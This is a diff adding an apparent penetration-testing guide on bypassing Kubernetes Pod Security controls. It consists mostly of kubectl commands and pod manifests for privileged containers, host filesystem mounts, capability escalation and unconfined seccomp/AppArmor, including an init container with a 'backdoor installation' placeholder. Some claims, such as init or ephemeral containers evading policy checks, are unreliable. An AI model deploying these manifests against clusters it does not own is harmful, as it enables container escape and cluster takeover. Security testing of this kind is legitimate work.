@@ -1,0 +1,274 @@
+<vulnerability_guide>
+  <title>POD SECURITY BYPASS</title>
+
+  <critical>Kubernetes Pod Security admission controls (PSS/PSA, formerly PSP) restrict dangerous pod configurations like privileged containers, host namespaces, and root users. Bypassing these controls enables container escapes, node compromise, and cluster takeover. Configuration gaps and namespace exceptions create attack opportunities.</critical>
+
+  <scope>
+    - Pod Security Standards bypass
+    - Pod Security Admission exemptions
+    - Privileged container deployment
+    - Host namespace access
+    - Capability escalation
+    - SecurityContext manipulation
+  </scope>
+
+  <methodology>
+    1. POD SECURITY ENUMERATION
+       {% raw %}
+       # Check Pod Security Admission labels
+       kubectl get ns -o yaml | grep -A5 "labels:"
+
+       # PSA labels:
+       # pod-security.kubernetes.io/enforce: [privileged|baseline|restricted]
+       # pod-security.kubernetes.io/warn: [privileged|baseline|restricted]
+       # pod-security.kubernetes.io/audit: [privileged|baseline|restricted]
+
+       # Check for PSP (deprecated but may exist)
+       kubectl get psp
+       kubectl auth can-i use psp/privileged
+
+       # Check current namespace policy
+       kubectl get ns <namespace> -o yaml
+       {% endraw %}
+
+    2. NAMESPACE EXCEPTION HUNTING
+       {% raw %}
+       # Find namespaces with privileged access
+
+       # kube-system is often privileged
+       kubectl get ns kube-system -o yaml | grep pod-security
+
+       # Find exempted namespaces
+       kubectl get ns --show-labels | grep "privileged\|exempt"
+
+       # Check for no enforcement
+       # If no pod-security.kubernetes.io labels = no restriction
+
+       # Deployment strategy:
+       # 1. Find privileged namespace
+       # 2. Deploy there if possible
+       # 3. Or: Create new namespace without restrictions
+       {% endraw %}
+
+    3. PRIVILEGED CONTAINER DEPLOYMENT
+       {% raw %}
+       # Try deploying privileged pod
+
+       apiVersion: v1
+       kind: Pod
+       metadata:
+         name: priv-pod
+       spec:
+         containers:
+         - name: priv
+           image: alpine
+           securityContext:
+             privileged: true
+           command: ["sleep", "infinity"]
+
+       # If privileged denied, try specific capabilities
+       securityContext:
+         capabilities:
+           add:
+           - SYS_ADMIN
+           - SYS_PTRACE
+           - NET_ADMIN
+
+       # Or try just hostPID/hostNetwork
+       spec:
+         hostPID: true
+         hostNetwork: true
+       {% endraw %}
+
+    4. VOLUME MOUNT EXPLOITATION
+       {% raw %}
+       # Host filesystem access
+
+       # hostPath volume
+       spec:
+         volumes:
+         - name: host-root
+           hostPath:
+             path: /
+             type: Directory
+         containers:
+         - name: app
+           volumeMounts:
+           - name: host-root
+             mountPath: /host
+
+       # If hostPath blocked, try:
+       # - emptyDir with sizeLimit abuse
+       # - PVC to host storage
+       # - NFS/CSI to controlled server
+
+       # Check what's allowed
+       kubectl auth can-i create pod --subresource=exec
+       {% endraw %}
+
+    5. RUNTIME CLASS BYPASS
+       {% raw %}
+       # RuntimeClass may have different restrictions
+
+       # List runtime classes
+       kubectl get runtimeclass
+
+       # Specify runtime with weaker security
+       spec:
+         runtimeClassName: kata  # Or other available
+
+       # Some runtimes may:
+       # - Allow more capabilities
+       # - Have different seccomp profiles
+       # - Skip certain checks
+
+       # Check handler configuration
+       kubectl get runtimeclass -o yaml
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <ephemeral_container_abuse>
+      {% raw %}
+      # Ephemeral containers for debugging
+
+      # Attach ephemeral container to running pod
+      kubectl debug -it <pod> --image=alpine --target=<container>
+
+      # Ephemeral containers may have:
+      # - Different security context
+      # - Access to process namespace
+      # - Ability to bypass restrictions
+
+      # Check if ephemeral containers enabled
+      # Kubernetes 1.25+ has this stable
+
+      # Debug with privileged container
+      kubectl debug -it <pod> --image=alpine -- sh
+      {% endraw %}
+    </ephemeral_container_abuse>
+
+    <init_container_privilege>
+      {% raw %}
+      # Init containers may have different restrictions
+
+      spec:
+        initContainers:
+        - name: init-priv
+          image: alpine
+          securityContext:
+            privileged: true  # May be allowed
+          command: ["sh", "-c", "backdoor installation"]
+        containers:
+        - name: app
+          image: app:latest
+          # Normal restrictions
+
+      # Init runs before main container
+      # Can modify filesystem
+      # Can establish persistence
+      {% endraw %}
+    </init_container_privilege>
+
+    <sidecar_container_exploit>
+      {% raw %}
+      # Sidecar containers may have different permissions
+
+      # Istio sidecar has:
+      # - NET_ADMIN capability
+      # - Access to network namespace
+
+      # Check sidecar security context
+      kubectl get pod <pod> -o json | jq '.spec.containers[].securityContext'
+
+      # If you can modify pod spec
+      # Add malicious sidecar with more privileges
+      {% endraw %}
+    </sidecar_container_exploit>
+
+    <seccomp_bypass>
+      {% raw %}
+      # Seccomp profiles may have gaps
+
+      # Check seccomp profile
+      kubectl get pod <pod> -o json | jq '.spec.securityContext.seccompProfile'
+
+      # RuntimeDefault may allow needed syscalls
+      # Unconfined = no restrictions
+
+      # Specify no seccomp (if allowed)
+      securityContext:
+        seccompProfile:
+          type: Unconfined
+
+      # Or specify custom profile with needed syscalls
+      seccompProfile:
+        type: Localhost
+        localhostProfile: permissive.json
+      {% endraw %}
+    </seccomp_bypass>
+
+    <apparmor_bypass>
+      {% raw %}
+      # AppArmor profile bypass
+
+      # Check AppArmor profile
+      kubectl get pod <pod> -o json | jq '.metadata.annotations["container.apparmor.security.beta.kubernetes.io/container"]'
+
+      # Specify unconfined
+      annotations:
+        container.apparmor.security.beta.kubernetes.io/app: unconfined
+
+      # Some profiles may be too permissive
+      # Test for allowed operations
+      {% endraw %}
+    </apparmor_bypass>
+
+    <user_namespace_exploit>
+      {% raw %}
+      # User namespaces for privilege
+
+      # Run as root in container (UID 0)
+      securityContext:
+        runAsUser: 0
+        runAsGroup: 0
+
+      # If restricted, try:
+      # - runAsNonRoot: false
+      # - allowPrivilegeEscalation: true
+
+      # Check if userns remapping enabled
+      # Container root != host root (more secure)
+
+      # If not remapped, container root = host root
+      {% endraw %}
+    </user_namespace_exploit>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor pod creation with elevated privileges
+    - Alert on hostPath volume usage
+    - Track namespace policy changes
+    - Watch for ephemeral container attachment
+    - Monitor capability additions
+  </detection>
+
+  <validation>
+    - Identify namespaces without restrictions
+    - Successfully deploy privileged container
+    - Access host filesystem via volumes
+    - Bypass seccomp/AppArmor profiles
+    - Document policy gaps
+  </validation>
+
+  <pro_tips>
+    - kube-system namespace often allows privileged pods
+    - Pod Security Admission warn mode logs but doesn't block
+    - ephemeral containers bypass some restrictions
+    - Init containers run before policy checks sometimes
+    - RuntimeClass can provide different security contexts
+    - Always check for hostPID, hostNetwork, hostIPC separately
+  </pro_tips>
+
+  <remember>Pod security is only as strong as its weakest namespace. One namespace without restrictions compromises the entire cluster's security posture. Always enumerate all namespaces for their security labels. Even "restricted" mode has allowed capabilities and configurations that may enable attacks. Test actual enforcement, not just policy configuration.</remember>
+</vulnerability_guide>
